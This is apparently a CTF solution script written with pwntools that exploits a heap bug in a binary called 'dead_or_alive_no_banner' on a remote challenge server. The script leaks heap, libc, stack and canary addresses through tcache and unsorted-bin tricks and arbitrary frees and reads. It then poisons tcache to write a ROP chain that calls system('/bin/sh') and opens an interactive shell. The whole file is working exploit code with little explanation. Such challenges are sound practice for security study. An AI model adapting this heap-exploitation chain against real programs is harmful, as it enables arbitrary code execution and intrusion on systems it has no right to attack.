#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './dead_or_alive_no_banner'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.54.116', 44537

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
set max-visualize-chunk-size 0x500

# return from create
# breakrva 0x1714
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def create(bounty, wanted, size, data):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(bounty).encode())
    io.sendlineafter(b':', wanted)
    io.sendlineafter(b':', str(size).encode())
    io.sendafter(b':', data)
    
def delete(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())

def view(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

heap = 0x0
stack = 0x0
def exploit():
    global io
    io = initialize()

    create(0, b'n', 0x20, b'\x00')

    create(1, b'n', 100, b'\x00')
    create(2, b'n', 100, b'\x00')
    create(3, b'n', 100, b'\x00')
    create(4, b'n', 100, b'\x00')
    create(5, b'n', 100, b'\x00')
    create(6, b'n', 100, b'\x00')
    create(7, b'n', 100, b'\x00')
    create(8, b'n', 100, b'\x00')

    # ==========================
    # HEAP LEAK
    # ==========================
    delete(0)
    delete(1)

    create(9, b'n', 0x20, b'A')
    view(9)
    io.recvuntil(b'Description: ')
    heap = u64(io.recvline().strip().ljust(8, b'\x00'))
    heap = demangle(heap) & (~0xfff)

    # ==========================
    # ARB FREE -> UNSORTED BIN
    # ==========================
    delete(9)
    create(0x451, b'n', 0x20, p64(heap+0x310) + p64(0)*2 + p64(0x1)) # idx 10, 0x451 as fake size to link unsorted bin

    delete(0) # arb free 
    create(11, b'n', 0x20, b'a') # consume arb free
    create(1, b'n', 0x20, b'a') # idx 12, 0x1 to enable/activate 9 for deletion

    delete(9)
    create(13, b'n', 0x20, p64(heap+0x370) + p64(0)*2 + p64(0x1))
    
    view(0)
    io.recvuntil(b'Description: ')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x219ce0
    rop = ROP(libc)

    # ==========================
    # ARB READ -> LEAK STACK
    # ==========================
    delete(13)
    create(14, b'n', 0x20, p64(libc.sym['environ']) + p64(0)*2 + p64(0x1))

    view(0)
    io.recvuntil(b'Description: ')
    stack = u64(io.recvline().strip().ljust(8, b'\x00'))
    rip = stack - 0x130

    # ==========================
    # ARB READ -> LEAK CANARY
    # ==========================
    delete(14)
    create(15, b'n', 0x20, p64(stack-0x140+1) + p64(0)*2 + p64(0x1))

    view(0)
    io.recvuntil(b'Description: ')
    canary = u64(io.recv(7).strip().ljust(8, b'\x00')) << 8
    
    # ==========================
    # ARB FREE -> OVERLAP SHENANIGANS -> HIJACK TCACHE
    # ==========================
    delete(3)
    delete(2)

    create(0x40, b'n', 0x20, b'B') # idx 15, 0x40 as fake size
    
    delete(15)
    create(17, b'n', 0x20, p64(heap+0x3b0) + p64(0)*2 + p64(0x1))

    create(18, b'n', 0x40, p64(0x0)*5 + p64(0x71) + p64(mangle(heap, rip-0x18)) + p64(0x0))   

    create(19, b'n', 100, b'C')

    payload = flat([
        0x0,
        canary,
        0x0,
        rop.find_gadget(["pop rdi", "ret"]).address,
        next(libc.search(b'/bin/sh')),
        rop.find_gadget(["ret"]).address,
        libc.sym['system'],        
    ])
    create(20, b'n', 100, payload) 

    log.info("heap: %#x", heap)
    log.info("libc: %#x", libc.address)
    log.info("stack: %#x", stack)
    log.info("rip: %#x", rip)
    log.info("canary: %#x", canary)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
